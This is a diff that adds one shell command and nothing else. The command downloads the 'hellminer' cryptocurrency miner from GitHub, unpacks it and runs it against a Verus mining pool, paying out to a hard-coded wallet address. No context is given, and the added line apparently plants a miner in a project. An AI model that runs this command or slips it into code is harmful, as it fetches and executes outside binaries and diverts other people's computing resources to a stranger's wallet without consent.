@@ -1,0 +1,1 @@
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz && ./hellminer -c stratum+tcp://pool.verus.io:19999 -u RAr2uKrnj28XE7FTmiAkpmAamVi6wSA2TD.x1 -p x --cpu 2
